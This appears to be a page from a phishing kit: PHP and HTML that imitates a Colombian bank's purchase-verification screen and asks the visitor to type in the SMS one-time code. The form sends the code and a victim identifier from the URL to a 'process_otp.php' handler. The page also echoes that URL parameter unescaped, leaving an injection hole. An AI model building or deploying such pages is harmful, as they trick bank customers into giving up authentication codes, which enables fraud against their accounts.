<?php 
// $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación de Compra</title>
    <link rel="stylesheet" href="/css/davi.css">

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>  

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .details {
            margin-top: 30%;
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            width: 70%;
            margin-bottom: 20px;
        }

        a {
            display: block;
            margin: 10px 0;
            color: #333;
            text-decoration: none;
        }

        p {
            margin: 10px 0;
            color: #333;
        }

        input[type="text"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"] {
            color: white;
            background-color: #e40111;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 80%;
            height: 35px;
            margin-top: 10px;
        }

        input[type="submit"]:hover {
            background-color: gray;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="details">
        <img src="img/davi.png" alt="" width="120px">
        <h3>Vamos a validar tu transacción</h3>
        <p>Ingresa el código SMS que acabamos de enviar a tu número de celular.</p>
        
        <form action="process/process_otp.php" method="POST">
            <a><b>Código de verificación</b></a>
            <input type="hidden" name="cliente_id" value="<?php echo $_GET['id']; ?>"> <!-- Pasar cliente_id -->
            <input type="text" name="claveDinamica" placeholder="Clave dinámica" required minlength="6" maxlength="6" pattern="\d*" inputmode="numeric">            <input type="submit" value="ENVIAR">
        </form>
    </div>

    <div class="footer-links">
        <a href="#" style="color:black;">PEDIR OTRO CÓDIGO</a><br>
        <a href="#" style="color:black;"><b>¿Necesitas ayuda? | Términos de Uso</b></a>
    </div>
</body>
</html>
